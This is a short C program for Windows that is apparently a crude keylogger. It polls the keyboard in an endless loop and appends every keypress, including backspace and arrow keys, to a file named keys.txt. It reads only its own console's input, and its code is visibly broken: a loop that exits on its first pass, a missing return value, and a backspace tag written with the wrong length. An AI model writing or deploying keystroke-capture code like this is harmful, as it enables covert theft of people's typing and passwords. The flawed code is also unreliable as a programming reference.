#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <conio.h>


#define WRITE_DIR "keys.txt"
// Macros equating the key name to the integer value
// check seperately
#define KEY_BACKSPACE 8
#define KEY_ENTER 13
#define KEY_ARROW_RIGHT 77
#define KEY_ARROW_LEFT 75
#define KEY_ARROW_UP 72
#define KEY_ARROW_DOWN 80

#define KEY BYTE

// special keys
static KEY KEYS_LIST[] = {KEY_ENTER, KEY_ARROW_RIGHT, KEY_ARROW_LEFT, KEY_ARROW_UP, KEY_ARROW_DOWN};
// the number of elements in KEYS_LIST
static size_t KEYS_LIST_LENGTH = sizeof(KEYS_LIST) / sizeof(KEY);
// File pointer for writing
static FILE * fp;

void open_file() {
    fp = fopen(WRITE_DIR, "a");
}

void close_file() {
    fclose(fp);
}


char get_pressed_key() {
    if (kbhit()) {
        return getch();
    }

    else return 0;
}

BOOLEAN write_special_key_return_TRUE_if_written_else_return_FALSE(KEY key) {
    if (key == KEY_BACKSPACE) {
        fwrite(" [BACKSPACE] ", 1, strlen(" BACKSPACE ") + 1, fp);
        
    }
    unsigned int i = 0;
    for (i; i<KEYS_LIST_LENGTH;i++) {
        if (KEYS_LIST[i] == key) fputc(key, fp);
        return FALSE;
    }
}

void write_non_special_key(KEY key) {
    if (key == ' ') fputc('\n', fp);
    else fputc(key, fp);
}



int main(void) {
    char ch;
    
    while (1) {
        ch = get_pressed_key();
        if (ch != 0) {
            open_file();
            BOOLEAN is_written = write_special_key_return_TRUE_if_written_else_return_FALSE(ch);
            write_non_special_key(ch);
            close_file();
        }
    }


    return EXIT_SUCCESS;
}
